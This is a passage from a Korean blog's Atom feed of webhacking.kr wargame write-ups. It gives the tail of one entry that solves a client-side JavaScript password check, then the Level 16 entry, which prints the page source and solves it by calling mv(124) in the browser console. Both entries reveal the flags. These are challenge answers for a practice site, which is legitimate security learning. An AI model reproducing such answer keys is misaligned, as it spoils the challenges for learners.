unlock=100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10+100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10-100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10/100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10*100*10*10+100/10-10+10+50-9*8+7-6+5-4*3-2*1*10+9999999999; function sub(){ if(login.pw.value==unlock){ alert(&quot;Password is &quot;+unlock/10); }else { alert(&quot;Wrong&quot;); }} &amp;lt;/script&amp;gt; unlock 값과 패스워드가 같으면 끝. 계산은… 크롬이 대신 해준다. flag : 999780930.7</summary></entry><entry><title type="html">[Web.kr]Level 16</title><link href="http://localhost:4000/2018/09/03/writeup-webkr-Level-16.html" rel="alternate" type="text/html" title="[Web.kr]Level 16" /><published>2018-09-03T00:00:00+00:00</published><updated>2018-09-03T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/03/writeup-webkr-Level%2016</id><content type="html" xml:base="http://localhost:4000/2018/09/03/writeup-webkr-Level-16.html">&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 16/4E5A62F4-0F2D-4C82-86D1-14DF4F8AC772.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;키보드 를 누르면 ‘*’ 문자가 생기고 마우스를 갖다 대면 지워진다…&lt;/p&gt;

&lt;p&gt;뭥미…? 😕&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Challenge 16&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;bgcolor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;black&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onload=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;kk(1,1)&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onkeypress=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;mv(event.keyCode)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;font&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;color=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;silver&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/font&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;font&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;color=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;yellow&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;position:relative&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/font&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;font color=yellow id=aa style=position:relative;left:0;top:0&amp;gt;*&amp;lt;/font&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posLeft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posTop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posLeft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posLeft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posLeft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posLeft&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posTop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posTop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posTop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;posTop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;124&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;rndc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;font color=#&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rndc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; id=aa style=position:relative;left:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;top:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; onmouseover=this.innerHTML=''&amp;gt;*&amp;lt;/font&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;mv 함수를 자세히 보니 cd의 값을 비교하며 작업을 수행하는데 마지막 부분에 cd가 124이면 특정 사이트로 이동 되는것 같다.&lt;/p&gt;

&lt;p&gt;cd값을 어떻게 변경해야 할까?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 16/F7E5C168-3DA2-4B5D-BA10-B86CECCA696F.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;python으로 확인해보니 ascii값 124는 ‘&lt;/td&gt;
      &lt;td&gt;‘(파이프) 였다.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 16/09CCD8A1-F443-4CCE-AF33-BA4742144046.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;크롬 개발자모드의 콘솔에서 mv함수를 강제로 불러와 인자값으로 124를 넘겨줘도 풀릴것 같다.&lt;/p&gt;

&lt;h4 id=&quot;flag--webhackingkr&quot;&gt;flag : webhacking.kr&lt;/h4&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="Wargame" /><category term="webhacking.kr(Old)" /><category term="Write-up" /><summary type="html">키보드 를 누르면 ‘*’ 문자가 생기고 마우스를 갖다 대면 지워진다… 뭥미…? 😕 &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Challenge 16&amp;lt;/title&amp;gt; &amp;lt;body bgcolor=black onload=kk(1,1) onkeypress=mv(event.keyCode)&amp;gt; &amp;lt;font color=silver id=c&amp;gt;&amp;lt;/font&amp;gt; &amp;lt;font color=yellow size=100 style=position:relative id=star&amp;gt;*&amp;lt;/font&amp;gt; &amp;lt;script&amp;gt; document.body.innerHTML+=&quot;&amp;lt;font color=yellow id=aa style=position:relative;left:0;top:0&amp;gt;*&amp;lt;/font&amp;gt;&quot;; function mv(cd) { kk(star.style.posLeft-50,star.style.posTop-50); if(cd==100) star.style.posLeft=star.style.posLeft+50; if(cd==97) star.style.posLeft=star.style.posLeft-50; if(cd==119) star.style.posTop=star.style.posTop-50; if(cd==115) star.style.posTop=star.style.posTop+50; if(cd==124) location.href=String.fromCharCode(cd); } function kk(x,y) { rndc=Math.floor(Math.random()*9000000); document.body.innerHTML+=&quot;&amp;lt;font color=#&quot;+rndc+&quot; id=aa style=position:relative;left:&quot;+x+&quot;;top:&quot;+y+&quot; onmouseover=this.innerHTML=''&amp;gt;*&amp;lt;/font&amp;gt;&quot;; } &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; mv 함수를 자세히 보니 cd의 값을 비교하며 작업을 수행하는데 마지막 부분에 cd가 124이면 특정 사이트로 이동 되는것 같다. cd값을 어떻게 변경해야 할까? python으로 확인해보니 ascii값 124는 ‘ ‘(파이프) 였다. 크롬 개발자모드의 콘솔에서 mv함수를 강제로 불러와 인자값으로 124를 넘겨줘도 풀릴것 같다. flag : webhacking.kr</summary></entry></feed>